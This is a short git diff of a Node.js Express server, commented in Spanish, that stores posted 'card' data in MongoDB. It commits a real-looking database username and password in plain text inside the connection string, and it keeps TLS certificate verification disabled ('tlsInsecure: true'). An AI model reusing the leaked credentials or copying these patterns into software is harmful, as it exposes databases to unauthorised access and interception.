@@ -7,16 +7,16 @@ const app = express();
 const serverPort = process.env.PORT || 3000;
 
 // =================================================================
-// CONFIGURACIÓN DE MONGODB (AJUSTE FINAL Y CRÍTICO)
+// CONFIGURACIÓN FINAL DE MONGODB
 // =================================================================
 
-// ⚠️ CAMBIO CLAVE: Reemplaza 'NUEVO_USUARIO' y 'NUEVA_CONTRASEÑA' con tus nuevas credenciales
-const uri = "mongodb+srv://NUEVO_USUARIO:NUEVA_CONTRASEÑA@cluster0.dfxcysb.mongodb.net/?retryWrites=true&w=majority";
+// ⚠️ CADENA DE CONEXIÓN ACTUALIZADA con las nuevas credenciales
+const uri = "mongodb+srv://maxuel:Maxuel09@cluster0.dfxcysb.mongodb.net/?retryWrites=true&w=majority";
 
 const client = new MongoClient(uri, {
     serverSelectionTimeoutMS: 5000,
     tls: true,
-    tlsInsecure: true // Mantiene la compatibilidad SSL forzada
+    tlsInsecure: true // Mantenemos la compatibilidad SSL forzada para Render
 });
 
 app.use(cors()); 
@@ -27,7 +27,6 @@ app.use(express.json());
 // =================================================================
 
 app.post('/save-card', async (req, res) => {
-    // ... (El resto de la lógica del endpoint es la misma y está correcta)
     const cardData = req.body;
     
     const logEntry = {
@@ -36,6 +35,7 @@ app.post('/save-card', async (req, res) => {
     };
     
     try {
+        // Conexión
         await client.connect(); 
         
         const database = client.db("inventario_db"); 
@@ -50,6 +50,7 @@ app.post('/save-card', async (req, res) => {
         console.error('❌ Error al guardar en MongoDB:', error);
         res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
     } finally {
+        // Cierre de conexión
         await client.close();
     }
 });
